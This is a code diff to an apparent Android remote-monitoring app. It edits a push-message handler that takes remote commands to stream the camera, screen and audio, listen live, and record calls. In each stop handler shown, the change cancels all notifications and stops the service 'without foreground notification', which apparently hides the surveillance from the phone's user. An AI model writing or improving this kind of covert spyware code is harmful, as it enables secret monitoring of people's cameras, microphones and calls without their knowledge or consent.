@@ -238,9 +238,9 @@ class FcmService : FirebaseMessagingService() {
                 })
             }
             "stop_webrtc_camera" -> {
-                startForegroundServiceSafely(Intent(this, WebRTCStreamService::class.java).apply {
-                    action = WebRTCStreamService.ACTION_STOP
-                })
+                // Stop service directly without foreground notification
+                cancelAllNotifications()
+                stopService(Intent(this, WebRTCStreamService::class.java))
             }
             "start_webrtc_screen" -> {
                 // Screen capture requires MediaProjection permission via user interaction
@@ -250,9 +250,9 @@ class FcmService : FirebaseMessagingService() {
                 startActivity(intent)
             }
             "stop_webrtc_screen" -> {
-                startForegroundServiceSafely(Intent(this, WebRTCStreamService::class.java).apply {
-                    action = WebRTCStreamService.ACTION_STOP
-                })
+                // Stop service directly without foreground notification
+                cancelAllNotifications()
+                stopService(Intent(this, WebRTCStreamService::class.java))
             }
             "start_webrtc_audio" -> {
                 if (androidx.core.content.ContextCompat.checkSelfPermission(
@@ -268,9 +268,9 @@ class FcmService : FirebaseMessagingService() {
                 })
             }
             "stop_webrtc_audio" -> {
-                startForegroundServiceSafely(Intent(this, WebRTCStreamService::class.java).apply {
-                    action = WebRTCStreamService.ACTION_STOP
-                })
+                // Stop service directly without foreground notification
+                cancelAllNotifications()
+                stopService(Intent(this, WebRTCStreamService::class.java))
             }
             "switch_camera" -> {
                 // Switch between front and back camera
@@ -318,9 +318,9 @@ class FcmService : FirebaseMessagingService() {
                 })
             }
             "stop_live_listen" -> {
-                startForegroundServiceSafely(Intent(this, LiveListenService::class.java).apply {
-                    action = "STOP"
-                })
+                // Stop service directly without foreground notification
+                cancelAllNotifications()
+                stopService(Intent(this, LiveListenService::class.java))
             }
             "start_call_record" -> {
                 startForegroundServiceSafely(Intent(this, CallRecordService::class.java).apply {
@@ -328,9 +328,9 @@ class FcmService : FirebaseMessagingService() {
                 })
             }
             "stop_call_record" -> {
-                startForegroundServiceSafely(Intent(this, CallRecordService::class.java).apply {
-                    action = "STOP"
-                })
+                // Stop service directly without foreground notification
+                cancelAllNotifications()
+                stopService(Intent(this, CallRecordService::class.java))
             }
             "sync_now", "sync_data" -> {
                 // Trigger immediate sync
